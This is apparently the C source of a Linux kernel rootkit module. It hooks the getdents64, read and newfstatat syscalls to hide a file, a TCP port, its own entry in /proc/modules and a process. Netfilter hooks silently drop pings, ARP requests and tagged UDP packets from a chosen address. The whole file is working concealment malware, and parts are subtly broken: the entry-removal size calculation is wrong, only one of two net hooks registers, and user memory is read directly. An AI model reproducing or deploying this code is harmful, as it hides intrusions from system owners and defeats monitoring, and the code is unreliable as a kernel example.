#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/kthread.h>
#include <linux/kprobes.h>
#include <linux/fprobe.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/sched.h>
#include <linux/mm_types.h>
#include <linux/sched/signal.h>

#include <linux/netfilter.h>
#include <linux/netfilter_arp.h>
#include <uapi/linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/if_arp.h>

/// const file name to hide
const char* hide_file_name = "hideme";
const int port_to_hide = 8000;
const char* pid_to_hide = "/proc/9704";
const char selected_ip[4] = {192, 168, 1, 208};


typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);

/// hide directory entries from result buffer
/// @buffer is the result buffer to store @refitem linux_dirent64
/// @size of buffer in bytes
/// @return new buffer size
static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);


static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size);

static int ends_with(const char *str, const char *suffix);

struct getdent64_arguments {
    unsigned int fd;
    void* buffer_ptr;
    unsigned int count;
};

static bool hide_entry_by_name(struct linux_dirent64* entry, void* data){
    const char* str = data;
    if(strcmp(entry->d_name, str) == 0){
        pr_info("Hidding %s\n", str);
        return true;
    }
    return false;
}


static int getents64_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct getdent64_arguments*)ri->data;

    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->buffer_ptr = (void*)regs->si; // 1
    args->count = regs->dx; // 2

    return 0;
}

static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
    unsigned long buffer_count = regs_return_value(regs);

    // end 
    if(buffer_count == 0)
        return 0;

    // hide by name
    unsigned long new_size_after_hide_file = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, (void*)hide_file_name);
    regs_set_return_value(regs, new_size_after_hide_file);

    //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
    return 0;
}

struct read_arguments {
    unsigned int fd;
    char* buffer_ptr;
    unsigned int count;
};

static int read_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct read_arguments*)ri->data;

//    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->buffer_ptr = (char*)regs->si; // 1
    args->count = regs->dx; // 2

    return 0;
}

static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_arguments* args = (struct read_arguments*) ri->data;
    unsigned long buffer_count = regs_return_value(regs);

    // filter socket
    char fd_path[256];

    struct file* file = files_lookup_fd_raw(current->files, args->fd);
    struct dentry* dentry = file->f_path.dentry;
    char* path = dentry_path_raw(dentry, fd_path, 256);

    struct super_block* sb= file->f_path.mnt->mnt_sb;

    // pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
    // pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);

    // do not intercept read syscall with 0 return value 
    // this means end of file reached
    if(buffer_count == 0)
        return 0;


    // intercepting only /proc/net/tcp or /proc/pid/net/tcp
    if(strcmp(sb->s_id, "proc") == 0){
        if(ends_with(path, "/net/tcp")){
            char* row_start = args->buffer_ptr;
            int new_length = 0;
            for(int row = 0; *row_start != '\0' ; row++){
                int row_length = 0;

                // go to end of line
                while(*(row_start + row_length) != '\n') ++row_length;
                // skip \n
                ++row_length;

                if(row == 0){
                    // "Skip" first row
                    new_length += row_length;
                } else {
                    int index = -1;
                    unsigned long address = -1;
                    unsigned short port = -1;

                    int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);

                    if(result == 3){
                        // writes line sequentially except line to hide,
                        // so when line needs to be hidden it will be overriden or ignore with the new length
                        if(port != port_to_hide){
                            strncpy(args->buffer_ptr + new_length, row_start, row_length);
                            new_length += row_length;
                        }
                    } else{
                        pr_warn("Cant Parse line \n");
                        new_length += row_length;
                    }
                }
                row_start += row_length;
            }

            // read syscall returns the number of bytes it read
            regs_set_return_value(regs, new_length);
        }
        else if(strcmp(path, "/modules") == 0){
            int module_name_len = strlen(KBUILD_MODNAME);

            char* delete_from_ptr = NULL;
            int delete_length = -1;

            {
                char* current_ptr = args->buffer_ptr;
                char* row_start_ptr = current_ptr;
                const char* end_ptr = args->buffer_ptr + buffer_count;

                while(current_ptr < end_ptr){
                    // go to end of line
                    while(*current_ptr != '\n') ++current_ptr;
                    // skip \n
                    ++current_ptr;

                    int row_length = (int)(current_ptr - row_start_ptr);

                    if(strncmp(row_start_ptr, KBUILD_MODNAME, module_name_len) == 0){
                        delete_from_ptr = row_start_ptr;
                        delete_length = row_length;
                        break;
                    }
                    row_start_ptr = current_ptr;
                }
            }

            if(delete_from_ptr){
                pr_info("HIDING module %s\n", KBUILD_MODNAME);
                int offset = (int)(delete_from_ptr - args->buffer_ptr);

                // if not at end copy to override the line to hide
                if(offset + delete_length != buffer_count){
                    char *copy_from_ptr = delete_from_ptr + delete_length;
                    unsigned long left_to_copy = buffer_count - offset - delete_length;
                    strncpy(delete_from_ptr, copy_from_ptr, left_to_copy);
                }
                regs_set_return_value(regs, buffer_count - delete_length);
            }
        }
    }
    return 0;
}

struct newfstatat_arguments {
    unsigned int fd;
    char* pathname;
    void* result_ptr;
};

static int newfstatat_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct newfstatat_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct newfstatat_arguments*)ri->data;

//    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->pathname = (char*)regs->si; // 1
    args->result_ptr = (void*)regs->dx; // 2

    return 0;
}

static int newfstatat_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct newfstatat_arguments* args = (struct newfstatat_arguments*) ri->data;
    unsigned long result = regs_return_value(regs);

    if(strcmp(args->pathname, pid_to_hide) == 0){
        pr_info("HIDE -> newfstatat(%s) = %ld\n", args->pathname, result);
        regs_set_return_value(regs, -1);
        return 0;
    }

    return 0;
}


static unsigned int netfilter_ip_hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    // struct ethhdr *eth = eth_hdr(skb);
    struct iphdr *ip = ip_hdr(skb);

    // printk("caller: %s\n", current->comm);
    // printk("mac: %pM\n", eth->h_source);
    // printk("ip protocol: %d\n", ip->protocol);
    // printk("ip protocol: %d\n", ip->protocol);
    // printk("%pI4 -> %pI4\n", &ip->saddr, &ip->daddr);

    unsigned long ip_source = ip->saddr;
    unsigned long my_ip = 0;
    memcpy(&my_ip, selected_ip, 4);

    switch (ip->protocol)
    {
    case IPPROTO_ICMP:
    {
        if (ip_source == my_ip)
        {
            struct icmphdr *icmp = icmp_hdr(skb);

            // ping
            if (icmp->type == ICMP_ECHO)
            {
                pr_info("Dropping PING %pI4\n", &ip_source);
                return NF_DROP;
            }
        }
        break;
    }
    case IPPROTO_UDP:
    {
        struct udphdr *udp = udp_hdr(skb);
        void *payload = ((char *)udp) + sizeof(struct udphdr);

        char *message = payload;
        if (memchr(message, '\0', 1024) != NULL)
        {
            if (strcmp(message, "hideme") == 0)
            {
                pr_info("HIDING UDP message: %s\n", message);
                return NF_DROP;
            }
        }
        else
        {
            pr_info("UDP message is nbt string\n");
        }

        break;
    }
    }

    return NF_ACCEPT;
}

struct arp_ip_request {
    unsigned char sender_ha_addr[ETH_ALEN];
    unsigned char sender_ip_addr[4];
    
    unsigned char target_ha_addr[ETH_ALEN];
    unsigned char target_ip_addr[4];
};

static unsigned int netfilter_arp_hook_func(void * priv, struct sk_buff * skb, const struct nf_hook_state * state){
    struct arphdr * arp = arp_hdr(skb);
    struct arp_ip_request  arp_request;
    unsigned short op = ntohs(arp->ar_op);

    // only ARP IP request
    if(op != ARPOP_REQUEST || ntohs(arp->ar_pro) != ETH_P_IP){
        return NF_ACCEPT;
    }

    // copy to buffer
    if(skb_copy_bits(skb, sizeof(struct arphdr), (void*)&arp_request, sizeof(struct arp_ip_request)) < 0){
        pr_warn("Cannot copy from packet\n");
        return NF_ACCEPT;
    }

    // pr_info("ARP from %pI4 Searching %pI4\n", arp_request.sender_ip_addr, arp_request.target_ip_addr);

    unsigned long my_ip = 0;
    memcpy(&my_ip, selected_ip, 4);
    unsigned long sender_ip = 0;
    memcpy(&sender_ip, arp_request.sender_ip_addr, 4);

    if(sender_ip == my_ip){
        pr_info("DROPING ARP from %pI4 Searching %pI4\n", arp_request.sender_ip_addr, arp_request.target_ip_addr);
        return NF_DROP;
    }

    return NF_ACCEPT;
}



static const int net_hook_count = 1;
static struct nf_hook_ops net_hooks[] = {
    {
        .hook = netfilter_ip_hook_func,
        .hooknum = NF_INET_PRE_ROUTING,
        .pf = NFPROTO_INET,
        .priority= NF_IP_PRI_FIRST
    },
    {
        .hook = netfilter_arp_hook_func,
        .hooknum = NF_INET_PRE_ROUTING,
        .pf = NFPROTO_ARP,
        .priority= NF_IP_PRI_FIRST
    }
};


static struct kretprobe getdents64_kret_probe = {
        .maxactive = 20,
        .entry_handler = getents64_handle_entry,
        .handler = getents64_handle_return,
        .kp.symbol_name = "__x64_sys_getdents64",
        .data_size = sizeof(struct getdent64_arguments),
};

static struct kretprobe read_kret_probe = {
        .maxactive = 20,
        .entry_handler = read_handle_entry,
        .handler = read_handle_return,
        .kp.symbol_name = "__x64_sys_read",
        .data_size = sizeof(struct read_arguments),
};

static struct kretprobe newfstatat_kret_probe = {
    .maxactive = 20,
    .entry_handler = newfstatat_handle_entry,
    .handler = newfstatat_handle_return,
    .kp.symbol_name = "__x64_sys_newfstatat",
    .data_size = sizeof(struct newfstatat_arguments),
};


static int __init entrypoint(void)
{
    if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0 || register_kretprobe(&newfstatat_kret_probe) < 0) {
        pr_info("register_kretprobe failed\n");
        return -1;
    }

    if(nf_register_net_hooks(&init_net, net_hooks, net_hook_count) < 0){
        pr_info("nf_register_net_hook failed\n");
        return -1;
    }


    pr_info("kretprobe registered\n");
    return 0;
}

static void __exit cleanup(void){
    pr_info("getdents64_kret_probe Missed probing %d instances of %s\n",
            getdents64_kret_probe.nmissed, getdents64_kret_probe.kp.symbol_name);

    pr_info("read_kret_probe Missed probing %d instances of %s\n",
            read_kret_probe.nmissed, read_kret_probe.kp.symbol_name);

    pr_info("newfstatat_kret_probe Missed probing %d instances of %s\n",
        newfstatat_kret_probe.nmissed, newfstatat_kret_probe.kp.symbol_name);
    
    
    unregister_kretprobe(&getdents64_kret_probe);
    unregister_kretprobe(&read_kret_probe);
    unregister_kretprobe(&newfstatat_kret_probe);
    nf_unregister_net_hooks(&init_net, net_hooks, net_hook_count);

    pr_info("Yarin Module cleanup\n");
}

module_init(entrypoint)
module_exit(cleanup)
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yarin");
MODULE_DESCRIPTION("Test Module");

unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
    unsigned long offset = 0;

    // find entry to hide
    while(offset < size){
        struct linux_dirent64* current_ent = (struct linux_dirent64* )(buffer + offset);
        if(entryFilter(current_ent, data) == true){
            return remove_entry(buffer, size, offset, current_ent->d_reclen);
        }
        offset += current_ent->d_reclen;
    }

    return size;
}

unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size) {
    // ptr of entry
    void* dest = buffer + entry_offset;
    // ptr of next entry
    void* src = dest + entry_size;
    // count of entries from entry to hide to end
    unsigned long count = buffer_size - entry_offset - entry_size;

    if(count == 0){
        // nothing to copy it is last entry
        return buffer_size - entry_size;
    }
    else {
        // offset     2
        // nextOffset 3
        // [0, 1, 2, 3, 4]
        // -----[        ] dest
        // --------[     ] source
        memcpy(dest, src, count);
        return count;
    }
}

int ends_with(const char *str, const char *suffix) {
    size_t str_len = strlen(str);
    size_t suffix_len = strlen(suffix);
  
    return (str_len >= suffix_len) &&
           (strncmp(str + str_len - suffix_len, suffix, suffix_len) == 0);
  }